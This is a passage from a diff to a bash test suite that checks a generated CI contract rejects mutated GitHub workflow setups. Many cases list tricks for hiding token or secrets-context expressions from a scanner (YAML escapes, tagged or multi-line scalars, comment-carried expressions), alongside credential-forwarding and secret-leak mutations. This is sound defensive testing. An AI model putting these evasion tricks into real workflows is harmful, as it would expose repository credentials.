-if [ "$status" -eq 0 ]; then
-  fail "emitted suite accepts a matrixed changelog job"
-else
-  pass "emitted suite rejects strategy fields that suffix the required context (#835)"
-fi
+expect_scheduled_rejection 'changelog.yml changelog job may contain only the canonical uses and with fields; name, strategy, matrix, and other check-shaping fields are forbidden' \
+  "emitted suite rejects strategy fields that suffix the required context (#835)" \
+  "emitted suite accepts a matrixed changelog job"
 SCHED_SCRIPT
 )"
 
@@ -2199,11 +2347,9 @@ cp -a "$generated_adopter" "$secrets_job_adopter"
 sed -i 's/^    with:$/    secrets:/' \
   "$secrets_job_adopter/.github/workflows/changelog.yml"
 schedule_adopter_script "$secrets_job_adopter" "$(cat <<'SCHED_SCRIPT'
-if [ "$status" -eq 0 ]; then
-  fail "emitted suite accepts changelog inputs nested under secrets"
-else
-  pass "emitted suite binds changelog inputs to the canonical with mapping (#835)"
-fi
+expect_scheduled_rejection 'changelog.yml changelog inputs must be nested under exactly one canonical with mapping' \
+  "emitted suite binds changelog inputs to the canonical with mapping (#835)" \
+  "emitted suite accepts changelog inputs nested under secrets"
 SCHED_SCRIPT
 )"
 
@@ -2212,11 +2358,9 @@ cp -a "$generated_adopter" "$typo_job_adopter"
 sed -i 's/^    with:$/    wiht:/' \
   "$typo_job_adopter/.github/workflows/changelog.yml"
 schedule_adopter_script "$typo_job_adopter" "$(cat <<'SCHED_SCRIPT'
-if [ "$status" -eq 0 ]; then
-  fail "emitted suite accepts changelog inputs nested under a typo mapping"
-else
-  pass "emitted suite rejects a typo in the canonical with mapping (#835)"
-fi
+expect_scheduled_rejection 'changelog.yml changelog inputs must be nested under exactly one canonical with mapping' \
+  "emitted suite rejects a typo in the canonical with mapping (#835)" \
+  "emitted suite accepts changelog inputs nested under a typo mapping"
 SCHED_SCRIPT
 )"
 
@@ -2225,22 +2369,18 @@ cp -a "$generated_adopter" "$extra_input_adopter"
 sed -i '/^      contract_ref:/a\      unexpected_input: true' \
   "$extra_input_adopter/.github/workflows/changelog.yml"
 schedule_adopter_script "$extra_input_adopter" "$(cat <<'SCHED_SCRIPT'
-if [ "$status" -eq 0 ]; then
-  fail "emitted suite accepts an additional changelog caller input"
-else
-  pass "emitted suite enforces the exact changelog caller input set (#835)"
-fi
+expect_scheduled_rejection 'changelog.yml changelog inputs must be exactly changelog and contract_ref, plus optional canonical adr-index' \
+  "emitted suite enforces the exact changelog caller input set (#835)" \
+  "emitted suite accepts an additional changelog caller input"
 SCHED_SCRIPT
 )"
 
 split_adopter="$tmproot/adopter-split-generated-artifacts"
 build_split_adopter "$split_adopter"
 schedule_adopter_script "$split_adopter" "$(cat <<'SCHED_SCRIPT'
-if [ "$status" -eq 0 ]; then
-  fail "emitted suite accepts duplicate changelog callers at two paths"
-else
-  pass "emitted suite retires the ambiguous split caller topology (#835)"
-fi
+expect_scheduled_rejection 'workflow set contains 2 reusable callers capable of publishing changelog / validate; keep only .github/workflows/changelog.yml' \
+  "emitted suite retires the ambiguous split caller topology (#835)" \
+  "emitted suite accepts duplicate changelog callers at two paths"
 SCHED_SCRIPT
 )"
 
@@ -2249,11 +2389,9 @@ cp -a "$generated_adopter" "$renamed_duplicate_adopter"
 cp "$renamed_duplicate_adopter/.github/workflows/changelog.yml" \
   "$renamed_duplicate_adopter/.github/workflows/docs-validation.yml"
 schedule_adopter_script "$renamed_duplicate_adopter" "$(cat <<'SCHED_SCRIPT'
-if [ "$status" -eq 0 ]; then
-  fail "emitted suite accepts a duplicate caller hidden behind another filename"
-else
-  pass "emitted suite scans every workflow for renamed duplicate callers (#835)"
-fi
+expect_scheduled_rejection 'workflow set contains 2 reusable callers capable of publishing changelog / validate; keep only .github/workflows/changelog.yml' \
+  "emitted suite scans every workflow for renamed duplicate callers (#835)" \
+  "emitted suite accepts a duplicate caller hidden behind another filename"
 SCHED_SCRIPT
 )"
 
@@ -2270,11 +2408,9 @@ jobs:
       contract_ref: $sha
 YAML
 schedule_adopter_script "$legacy_duplicate_adopter" "$(cat <<'SCHED_SCRIPT'
-if [ "$status" -eq 0 ]; then
-  fail "emitted suite accepts a legacy caller beside the canonical caller"
-else
-  pass "emitted suite rejects an additional changelog-validate caller (#835)"
-fi
+expect_scheduled_rejection 'workflow set contains 2 reusable callers capable of publishing changelog / validate; keep only .github/workflows/changelog.yml' \
+  "emitted suite rejects an additional changelog-validate caller (#835)" \
+  "emitted suite accepts a legacy caller beside the canonical caller"
 SCHED_SCRIPT
 )"
 
@@ -2295,11 +2431,9 @@ missing_adr_test_adopter="$tmproot/adopter-adr-without-suite"
 cp -a "$adr_adopter" "$missing_adr_test_adopter"
 rm -f "$missing_adr_test_adopter/scripts/gen-adr-index.test.sh"
 schedule_adopter_script "$missing_adr_test_adopter" "$(cat <<'SCHED_SCRIPT'
-if [ "$status" -eq 0 ]; then
-  fail "emitted suite accepts ADR checking without the pinned generator suite"
-else
-  pass "emitted suite rejects ADR checking without its pinned generator suite (#1380)"
-fi
+expect_scheduled_rejection 'adr-index: true requires the pinned scripts/gen-adr-index.test.sh.' \
+  "emitted suite rejects ADR checking without its pinned generator suite (#1380)" \
+  "emitted suite accepts ADR checking without the pinned generator suite"
 SCHED_SCRIPT
 )"
 
@@ -2308,11 +2442,9 @@ cp -a "$adr_adopter" "$handwritten_adr_test_adopter"
 printf '#!/usr/bin/env bash\necho "ok - looks like a test"\n' \
   >"$handwritten_adr_test_adopter/scripts/gen-adr-index.test.sh"
 schedule_adopter_script "$handwritten_adr_test_adopter" "$(cat <<'SCHED_SCRIPT'
-if [ "$status" -eq 0 ]; then
-  fail "emitted suite accepts a hand-written ADR generator suite"
-else
-  pass "emitted suite rejects a hand-written ADR generator suite (#1380)"
-fi
+expect_scheduled_rejection 'scripts/gen-adr-index.test.sh declares 0 generator-mode headers' \
+  "emitted suite rejects a hand-written ADR generator suite (#1380)" \
+  "emitted suite accepts a hand-written ADR generator suite"
 SCHED_SCRIPT
 )"
 rm -f "$adr_adopter/scripts/gen-adr-index.sh"
@@ -2502,20 +2634,25 @@ for failure in renderer download digest python; do
   failing="$tmproot/adopter-$failure-failure"
   build_adopter "$failing"
   inject_render_failure "$failing" "$failure"
-  if run_adopter "$failing"; then
-    fail "a $failure failure with renderable NEXT/ fragments reported success"
-  else
-    pass "a $failure failure with renderable NEXT/ fragments fails closed"
-  fi
+  schedule_adopter_script "$failing" "$(cat <<'SCHED_SCRIPT'
+expect_scheduled_rejection 'render-next failed for a reason other than an emptied NEXT/' \
+  "a $failure failure with renderable NEXT/ fragments fails closed" \
+  "a $failure failure with renderable NEXT/ fragments reported success"
+SCHED_SCRIPT
+)"
 
   emptied="$tmproot/adopter-$failure-empty"
   build_adopter "$emptied"
   python3 "$contract_src" release --repo-root "$emptied" --version v1.0.0 >/dev/null 2>&1
   inject_render_failure "$emptied" "$failure"
-sync_last_rejection
-  run_adopter "$emptied" \
-    && pass "a genuinely emptied NEXT/ remains distinct from a $failure failure" \
-    || fail "an emptied NEXT/ is mistaken for a $failure failure: $(tail -3 "$tmproot/run.out")"
+  schedule_adopter_script "$emptied" "$(cat <<'SCHED_SCRIPT'
+if [ "$status" -eq 0 ]; then
+  pass "a genuinely emptied NEXT/ remains distinct from a $failure failure"
+else
+  fail "an emptied NEXT/ is mistaken for a $failure failure: $(tail -3 "$ADOPTER_LOG")"
+fi
+SCHED_SCRIPT
+)"
 done
 
 # An adopter with nothing to publish has no release.yml; `agents` and
@@ -2607,9 +2744,27 @@ expect_rejection_body() {
 }
 
 expect_rejection() {
-  # expect_rejection <label> <mutator-fn> [mutator-args...]
-  local label="$1" mutator="$2" seq result
+  # expect_rejection --reason <text> [--pass <msg>] [--fail <msg>] <label> <mutator-fn> [mutator-args...]
+  #
+  # A nonzero exit alone proves only that something refused the mutation, so
+  # every case names the diagnostic it expects (#1974). The reason is checked
+  # inside the case's own job against its own log: the main thread never waits
+  # on one case to grep it, so the ADOPTER_SLOTS pool stays full.
+  local reason='' pass_msg='' fail_msg='' label mutator seq result log
+  while [ "$#" -gt 0 ]; do
+    case "$1" in
+      --reason) reason="$2"; shift 2 ;;
+      --pass) pass_msg="$2"; shift 2 ;;
+      --fail) fail_msg="$2"; shift 2 ;;
+      *) break ;;
+    esac
+  done
+  label="$1" mutator="$2"
   shift 2
+  # Checked before shard selection, so every shard refuses an unasserted case.
+  [ -n "$reason" ] || { echo "FAIL - expect_rejection '$label' names no expected reason"; exit 1; }
+  pass_msg="${pass_msg:-emitted suite rejects $label for its stated reason}"
+  fail_msg="${fail_msg:-emitted suite rejected $label for another reason}"
   if ! changelog_caller_case_selected "$label"; then
     caller_assertions_suspended=1
     return 0
@@ -2623,6 +2778,12 @@ expect_rejection() {
     caller_case_nested=1
     ADOPTER_ISOLATED_LOG=1
     expect_rejection_body "$seq" "$label" "$mutator" "$@"
+    log="$tmproot/reject-$seq.contract-out"
+    if grep -qF -- "$reason" "$log" 2>/dev/null; then
+      pass "$pass_msg"
+    else
+      fail "$fail_msg: $(tail -2 "$log" 2>/dev/null)"
+    fi
     printf '%s\n' "$fails" >"$result"
   ) &
   last_rejection_pid="$!"
@@ -4594,110 +4755,93 @@ rename_release_caller() {
   sed -i '/^    needs: verify$/d' "$1/.github/workflows/publish-package.yml"
 }
 
-expect_rejection "a renderer pinned to a different commit" break_pin
+expect_rejection --reason "scripts/render-next.sh is still at deadbeefdeadbeefdeadbeefdeadbeefdeadbeef" "a renderer pinned to a different commit" break_pin
 # .github/CODEOWNERS is a required member of the adopter set (ADR 0210, #1272):
 # absent, hand-edited, symlinked, or shadowed by a competing location all fail closed.
 drop_codeowners() { rm -f "$1/.github/CODEOWNERS"; }
 drift_codeowners() { printf '* @Verjson/someone-else\n' >>"$1/.github/CODEOWNERS"; }
 shadow_codeowners() { cp "$1/.github/CODEOWNERS" "$1/CODEOWNERS"; }
 symlink_codeowners() { mv "$1/.github/CODEOWNERS" "$1/CODEOWNERS.real" && ln -s ../CODEOWNERS.real "$1/.github/CODEOWNERS"; }
-expect_rejection "an adopter without .github/CODEOWNERS" drop_codeowners
-expect_rejection "a hand-edited .github/CODEOWNERS" drift_codeowners
-expect_rejection "a competing root CODEOWNERS beside the canonical file" shadow_codeowners
-expect_rejection "a symlinked .github/CODEOWNERS" symlink_codeowners
+expect_rejection --reason "is absent, so main-protection's code-owner review requirement asks for nothing here" "an adopter without .github/CODEOWNERS" drop_codeowners
+expect_rejection --reason "is not the generated artifact" "a hand-edited .github/CODEOWNERS" drift_codeowners
+expect_rejection --reason "CODEOWNERS competes with .github/CODEOWNERS; GitHub reads only the first location it" "a competing root CODEOWNERS beside the canonical file" shadow_codeowners
+expect_rejection --reason "must be a regular repository file, not reached through a symlink" "a symlinked .github/CODEOWNERS" symlink_codeowners
 symlink_github_dir() { mv "$1/.github" "$1/.github.real" && ln -s .github.real "$1/.github"; }
 docs_shadow_codeowners() { mkdir -p "$1/docs" && cp "$1/.github/CODEOWNERS" "$1/docs/CODEOWNERS"; }
 directory_codeowners() { rm -f "$1/.github/CODEOWNERS" && mkdir "$1/.github/CODEOWNERS"; }
-expect_rejection "a symlinked .github directory in front of CODEOWNERS" symlink_github_dir
-expect_rejection "a competing docs/CODEOWNERS beside the canonical file" docs_shadow_codeowners
-expect_rejection "a directory where .github/CODEOWNERS must be a file" directory_codeowners
-expect_rejection "a hand-written renderer that bypasses the contract" handwrite_renderer
-expect_rejection "a .releaserc.json that reintroduces release-on-merge" add_releaserc
-expect_rejection "a second authored running log in NEXT.md" add_authored_log
-expect_rejection "a fragment whose filename is not canonical" uncanonical_fragment
-expect_rejection "a non-executable renderer" strip_executable
-expect_rejection "a release caller without RELEASE_APP_CLIENT_ID" drop_release_app_client_id
-expect_rejection "a release caller without its release environment" drop_release_environment
-expect_rejection "a release caller restoring ORG_ADMIN_TOKEN" restore_org_admin_token
-expect_rejection "a release caller wiring GITHUB_TOKEN" wire_github_token
+expect_rejection --reason "traverses symlinked path component .github," "a symlinked .github directory in front of CODEOWNERS" symlink_github_dir
+expect_rejection --reason "competes with .github/CODEOWNERS; GitHub reads only the first location it finds, so" "a competing docs/CODEOWNERS beside the canonical file" docs_shadow_codeowners
+expect_rejection --reason "is absent, so main-protection's code-owner review requirement asks for nothing here" "a directory where .github/CODEOWNERS must be a file" directory_codeowners
+expect_rejection --reason "scripts/render-next.sh declares 0 generator-mode headers" "a hand-written renderer that bypasses the contract" handwrite_renderer
+expect_rejection --reason ".releaserc.json reintroduces semantic-release outside the contract" "a .releaserc.json that reintroduces release-on-merge" add_releaserc
+expect_rejection --reason "NEXT.md still holds log entries; NEXT/ is the only unreleased store" "a second authored running log in NEXT.md" add_authored_log
+expect_rejection --reason "filename does not follow the canonical contract" "a fragment whose filename is not canonical" uncanonical_fragment
+expect_rejection --reason "scripts/render-next.sh is not executable" "a non-executable renderer" strip_executable
+expect_rejection --reason "does not pass the organization RELEASE_APP_CLIENT_ID variable to the release workflow" "a release caller without RELEASE_APP_CLIENT_ID" drop_release_app_client_id
+expect_rejection --reason "does not select the release-app environment" "a release caller without its release environment" drop_release_environment
+expect_rejection --reason "does not select the release-app environment" "a release caller restoring ORG_ADMIN_TOKEN" restore_org_admin_token
+expect_rejection --reason "does not select the release-app environment" \
+  --pass "the broad-token rejection names the dedicated release App remedy" \
+  --fail "the last credential case failed for some other reason" \
+  "a release caller wiring GITHUB_TOKEN" wire_github_token
 
-# Rejected for the stated reason, not incidentally. expect_rejection only asserts
-# a non-zero exit, so without this the guard could rot while its case stays green.
-# It reads the LAST run, so it has to sit immediately after the credential cases.
-sync_last_rejection
-grep -qE 'snapshot forwards credentials|release-app environment' "$tmproot/run.out" \
-  && pass "the broad-token rejection names the dedicated release App remedy" \
-  || fail "the last credential case failed for some other reason: $(tail -2 "$tmproot/run.out")"
 
 # The cases above replace release_environment, so they are rejected before the
 # forwarding guard runs. These keep it and grow the job past a pipe's capacity:
 # a guard that pipes into an early-exit reader accepts both under pipefail.
-expect_rejection "a large snapshot job forwarding a credential before its padding" \
-  forward_credential_from_large_snapshot
-sync_last_rejection
-grep -qF 'snapshot forwards credentials instead of selecting its environment' "$tmproot/run.out" \
-  && pass "the snapshot forwarding guard holds for a job block larger than a pipe" \
-  || fail "a large credential-forwarding snapshot was not rejected by its forwarding guard: $(tail -2 "$tmproot/run.out")"
+expect_rejection --reason 'snapshot forwards credentials instead of selecting its environment' \
+  --pass "the snapshot forwarding guard holds for a job block larger than a pipe" \
+  --fail "a large credential-forwarding snapshot was not rejected by its forwarding guard" \
+  "a large snapshot job forwarding a credential before its padding" forward_credential_from_large_snapshot
 expect_release_mode_rejection release-artifact \
   "a large build job referencing a secret before its padding" \
   leak_secret_into_large_build_job \
   'build job references a secrets context; the build matrix runs adopter-owned scripts/release-build.sh'
 
-expect_rejection "a snapshot input carrying index-syntax token context access" snapshot_input_index_token
-sync_last_rejection
-grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
-  && pass "the snapshot job pin rejects index-syntax token context access" \
-  || fail "a snapshot input carrying index-syntax token context access was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a snapshot input carrying a token expression after a quoted #" snapshot_input_token_after_quoted_hash
-sync_last_rejection
-grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
-  && pass "the snapshot job pin rejects a token expression after a quoted #" \
-  || fail "a snapshot input carrying a token expression after a quoted # was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a snapshot input carrying dotted secrets context access" snapshot_input_dotted_secret
-sync_last_rejection
-grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
-  && pass "the snapshot job pin rejects dotted secrets context access" \
-  || fail "a snapshot input carrying dotted secrets context access was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a snapshot input carrying index-syntax secrets context access" snapshot_input_index_secret
-sync_last_rejection
-grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
-  && pass "the snapshot job pin rejects index-syntax secrets context access" \
-  || fail "a snapshot input carrying index-syntax secrets context access was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a snapshot input carrying a #-leading block scalar line carrying a token expression" snapshot_input_block_scalar_hash_line
-sync_last_rejection
-grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
-  && pass "the snapshot job pin rejects a #-leading block scalar line carrying a token expression" \
-  || fail "a snapshot input carrying a #-leading block scalar line carrying a token expression was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a snapshot input carrying a # after an escaped double quote" snapshot_input_hash_after_escaped_quote
-sync_last_rejection
-grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
-  && pass "the snapshot job pin rejects a # after an escaped double quote" \
-  || fail "a snapshot input carrying a # after an escaped double quote was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a snapshot input carrying a #-leading continuation of a multi-line quoted scalar" snapshot_input_multiline_quoted_hash_line
-sync_last_rejection
-grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
-  && pass "the snapshot job pin rejects a #-leading continuation of a multi-line quoted scalar" \
-  || fail "a snapshot input carrying a #-leading continuation of a multi-line quoted scalar was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a snapshot input carrying an object filter over the github context" snapshot_input_object_wildcard
-sync_last_rejection
-grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
-  && pass "the snapshot job pin rejects an object filter over the github context" \
-  || fail "a snapshot input carrying an object filter over the github context was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a snapshot input carrying an unverified dispatch version" snapshot_input_unverified_version
-sync_last_rejection
-grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
-  && pass "the snapshot job pin rejects an unverified dispatch version" \
-  || fail "a snapshot input carrying an unverified dispatch version was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a snapshot input carrying a prefix with text after the generated value" snapshot_input_suffixed_prefix
-sync_last_rejection
-grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
-  && pass "the snapshot job pin rejects a prefix with text after the generated value" \
-  || fail "a snapshot input carrying a prefix with text after the generated value was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a snapshot input carrying a dropped declared input" snapshot_input_dropped
-sync_last_rejection
-grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
-  && pass "the snapshot job pin rejects a dropped declared input" \
-  || fail "a snapshot input carrying a dropped declared input was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
+expect_rejection --reason 'snapshot job is not the generated snapshot job (#784)' \
+  --pass "the snapshot job pin rejects index-syntax token context access" \
+  --fail "a snapshot input carrying index-syntax token context access was not rejected by the snapshot job pin" \
+  "a snapshot input carrying index-syntax token context access" snapshot_input_index_token
+expect_rejection --reason 'snapshot job is not the generated snapshot job (#784)' \
+  --pass "the snapshot job pin rejects a token expression after a quoted #" \
+  --fail "a snapshot input carrying a token expression after a quoted # was not rejected by the snapshot job pin" \
+  "a snapshot input carrying a token expression after a quoted #" snapshot_input_token_after_quoted_hash
+expect_rejection --reason 'snapshot job is not the generated snapshot job (#784)' \
+  --pass "the snapshot job pin rejects dotted secrets context access" \
+  --fail "a snapshot input carrying dotted secrets context access was not rejected by the snapshot job pin" \
+  "a snapshot input carrying dotted secrets context access" snapshot_input_dotted_secret
+expect_rejection --reason 'snapshot job is not the generated snapshot job (#784)' \
+  --pass "the snapshot job pin rejects index-syntax secrets context access" \
+  --fail "a snapshot input carrying index-syntax secrets context access was not rejected by the snapshot job pin" \
+  "a snapshot input carrying index-syntax secrets context access" snapshot_input_index_secret
+expect_rejection --reason 'snapshot job is not the generated snapshot job (#784)' \
+  --pass "the snapshot job pin rejects a #-leading block scalar line carrying a token expression" \
+  --fail "a snapshot input carrying a #-leading block scalar line carrying a token expression was not rejected by the snapshot job pin" \
+  "a snapshot input carrying a #-leading block scalar line carrying a token expression" snapshot_input_block_scalar_hash_line
+expect_rejection --reason 'snapshot job is not the generated snapshot job (#784)' \
+  --pass "the snapshot job pin rejects a # after an escaped double quote" \
+  --fail "a snapshot input carrying a # after an escaped double quote was not rejected by the snapshot job pin" \
+  "a snapshot input carrying a # after an escaped double quote" snapshot_input_hash_after_escaped_quote
+expect_rejection --reason 'snapshot job is not the generated snapshot job (#784)' \
+  --pass "the snapshot job pin rejects a #-leading continuation of a multi-line quoted scalar" \
+  --fail "a snapshot input carrying a #-leading continuation of a multi-line quoted scalar was not rejected by the snapshot job pin" \
+  "a snapshot input carrying a #-leading continuation of a multi-line quoted scalar" snapshot_input_multiline_quoted_hash_line
+expect_rejection --reason 'snapshot job is not the generated snapshot job (#784)' \
+  --pass "the snapshot job pin rejects an object filter over the github context" \
+  --fail "a snapshot input carrying an object filter over the github context was not rejected by the snapshot job pin" \
+  "a snapshot input carrying an object filter over the github context" snapshot_input_object_wildcard
+expect_rejection --reason 'snapshot job is not the generated snapshot job (#784)' \
+  --pass "the snapshot job pin rejects an unverified dispatch version" \
+  --fail "a snapshot input carrying an unverified dispatch version was not rejected by the snapshot job pin" \
+  "a snapshot input carrying an unverified dispatch version" snapshot_input_unverified_version
+expect_rejection --reason 'snapshot job is not the generated snapshot job (#784)' \
+  --pass "the snapshot job pin rejects a prefix with text after the generated value" \
+  --fail "a snapshot input carrying a prefix with text after the generated value was not rejected by the snapshot job pin" \
+  "a snapshot input carrying a prefix with text after the generated value" snapshot_input_suffixed_prefix
+expect_rejection --reason 'snapshot job is not the generated snapshot job (#784)' \
+  --pass "the snapshot job pin rejects a dropped declared input" \
+  --fail "a snapshot input carrying a dropped declared input was not rejected by the snapshot job pin" \
+  "a snapshot input carrying a dropped declared input" snapshot_input_dropped
 expect_release_mode_rejection release-artifact \
   "a build step heredoc line that starts with # and carries a token expression" \
   build_heredoc_hash_line_token \
@@ -4706,11 +4850,10 @@ expect_release_mode_rejection release-artifact \
   "a build job env value filtering every property of the github context" \
   build_env_object_wildcard \
   'build job references a secrets context or GitHub token context (#1712)'
-expect_rejection "a snapshot job with a field the generator did not write" snapshot_extra_field
-sync_last_rejection
-grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
-  && pass "the snapshot job pin rejects a field the generator did not write" \
-  || fail "a snapshot job with an extra field was not rejected by the snapshot job pin: $(tail -2 "$tmproot/run.out")"
+expect_rejection --reason 'snapshot job is not the generated snapshot job (#784)' \
+  --pass "the snapshot job pin rejects a field the generator did not write" \
+  --fail "a snapshot job with an extra field was not rejected by the snapshot job pin" \
+  "a snapshot job with a field the generator did not write" snapshot_extra_field
 expect_release_mode_rejection release-artifact \
   "a build run body with a #-leading line the generator did not write" \
   build_run_body_hash_line \
@@ -4763,216 +4906,155 @@ else
 fi
 SCHED_SCRIPT
 )"
-expect_rejection "a verify step env value spelling an expression through a YAML escape" \
-  verify_escaped_expression
-sync_last_rejection
-grep -qF 'the release-shape check cannot read' "$tmproot/run.out" \
-  && pass "the release-shape check refuses a YAML escape it cannot read" \
-  || fail "a YAML escape in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verify step env value hiding an escape in a quoted scalar behind a block header" \
-  verify_quoted_scalar_behind_block_header
-sync_last_rejection
-grep -qF 'the release-shape check cannot read' "$tmproot/run.out" \
-  && pass "the release-shape check refuses a quoted scalar left open across lines" \
-  || fail "a multi-line quoted scalar in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verify step env value with a !!str-tagged quoted scalar left open across lines" verify_tagged_quoted_scalar_behind_block_header
-sync_last_rejection
-grep -qF 'the release-shape check cannot read' "$tmproot/run.out" \
-  && pass "the release-shape check refuses a !!str-tagged quoted scalar left open across lines" \
-  || fail "a !!str-tagged quoted scalar left open across lines in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verify step env value with a !-tagged quoted scalar left open across lines" verify_nonspecific_tagged_quoted_scalar_behind_block_header
-sync_last_rejection
-grep -qF 'the release-shape check cannot read' "$tmproot/run.out" \
-  && pass "the release-shape check refuses a !-tagged quoted scalar left open across lines" \
-  || fail "a !-tagged quoted scalar left open across lines in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verify step env value with a verbatim-tagged quoted scalar left open across lines" verify_verbatim_tagged_quoted_scalar_behind_block_header
-sync_last_rejection
-grep -qF 'the release-shape check cannot read' "$tmproot/run.out" \
-  && pass "the release-shape check refuses a verbatim-tagged quoted scalar left open across lines" \
-  || fail "a verbatim-tagged quoted scalar left open across lines in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verify step env value with an anchored quoted scalar left open across lines" verify_anchored_quoted_scalar_behind_block_header
-sync_last_rejection
-grep -qF 'the release-shape check cannot read' "$tmproot/run.out" \
-  && pass "the release-shape check refuses an anchored quoted scalar left open across lines" \
-  || fail "an anchored quoted scalar left open across lines in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verify step env value with full-line comments carrying an expression string across a value" verify_comment_carried_expression
-sync_last_rejection
-grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
-  && pass "the verify-job context scan sees the value between full-line comments" \
-  || fail "the verify-job context scan missed the value between full-line comments: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verify step env value with trailing comments carrying an expression string across a value" verify_trailing_comment_carried_expression
-sync_last_rejection
-grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
-  && pass "the verify-job context scan sees the value between trailing comments" \
-  || fail "the verify-job context scan missed the value between trailing comments: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verify step env value with a value leaving an expression string open across the next value" verify_value_carried_expression
-sync_last_rejection
-grep -qF 'an expression left open at the end of its scalar' "$tmproot/run.out" \
-  && pass "the release-shape check refuses a value leaving an expression string open across the next value" \
-  || fail "a value leaving an expression string open across the next value in the verify job was not refused for that reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verify step env value with an expression opened in a mapping key" verify_expression_in_mapping_key
-sync_last_rejection
-grep -qF 'an expression in a mapping key' "$tmproot/run.out" \
-  && pass "the release-shape check refuses an expression opened in a mapping key" \
-  || fail "an expression opened in a mapping key in the verify job was not refused for that reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verify step env value with an expression inside a flow collection" verify_expression_in_flow_collection
-sync_last_rejection
-grep -qF 'an expression inside a flow collection' "$tmproot/run.out" \
-  && pass "the release-shape check refuses an expression inside a flow collection" \
-  || fail "an expression inside a flow collection in the verify job was not refused for that reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a workflow-scope value after a comment carrying an expression string" \
-  workflow_scope_comment_carried_expression
-sync_last_rejection
-grep -qF 'exposes a GitHub token at workflow scope (#1712)' "$tmproot/run.out" \
-  && pass "the workflow-scope scan reads past a comment carrying an expression string" \
-  || fail "a workflow-scope token read after an expression-carrying comment was not refused by the scan: $(tail -2 "$tmproot/run.out")"
+expect_rejection --reason 'the release-shape check cannot read' \
+  --pass "the release-shape check refuses a YAML escape it cannot read" \
+  --fail "a YAML escape in the verify job was not refused as unreadable" \
+  "a verify step env value spelling an expression through a YAML escape" verify_escaped_expression
+expect_rejection --reason 'the release-shape check cannot read' \
+  --pass "the release-shape check refuses a quoted scalar left open across lines" \
+  --fail "a multi-line quoted scalar in the verify job was not refused as unreadable" \
+  "a verify step env value hiding an escape in a quoted scalar behind a block header" verify_quoted_scalar_behind_block_header
+expect_rejection --reason 'the release-shape check cannot read' \
+  --pass "the release-shape check refuses a !!str-tagged quoted scalar left open across lines" \
+  --fail "a !!str-tagged quoted scalar left open across lines in the verify job was not refused as unreadable" \
+  "a verify step env value with a !!str-tagged quoted scalar left open across lines" verify_tagged_quoted_scalar_behind_block_header
+expect_rejection --reason 'the release-shape check cannot read' \
+  --pass "the release-shape check refuses a !-tagged quoted scalar left open across lines" \
+  --fail "a !-tagged quoted scalar left open across lines in the verify job was not refused as unreadable" \
+  "a verify step env value with a !-tagged quoted scalar left open across lines" verify_nonspecific_tagged_quoted_scalar_behind_block_header
+expect_rejection --reason 'the release-shape check cannot read' \
+  --pass "the release-shape check refuses a verbatim-tagged quoted scalar left open across lines" \
+  --fail "a verbatim-tagged quoted scalar left open across lines in the verify job was not refused as unreadable" \
+  "a verify step env value with a verbatim-tagged quoted scalar left open across lines" verify_verbatim_tagged_quoted_scalar_behind_block_header
+expect_rejection --reason 'the release-shape check cannot read' \
+  --pass "the release-shape check refuses an anchored quoted scalar left open across lines" \
+  --fail "an anchored quoted scalar left open across lines in the verify job was not refused as unreadable" \
+  "a verify step env value with an anchored quoted scalar left open across lines" verify_anchored_quoted_scalar_behind_block_header
+expect_rejection --reason 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' \
+  --pass "the verify-job context scan sees the value between full-line comments" \
+  --fail "the verify-job context scan missed the value between full-line comments" \
+  "a verify step env value with full-line comments carrying an expression string across a value" verify_comment_carried_expression
+expect_rejection --reason 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' \
+  --pass "the verify-job context scan sees the value between trailing comments" \
+  --fail "the verify-job context scan missed the value between trailing comments" \
+  "a verify step env value with trailing comments carrying an expression string across a value" verify_trailing_comment_carried_expression
+expect_rejection --reason 'an expression left open at the end of its scalar' \
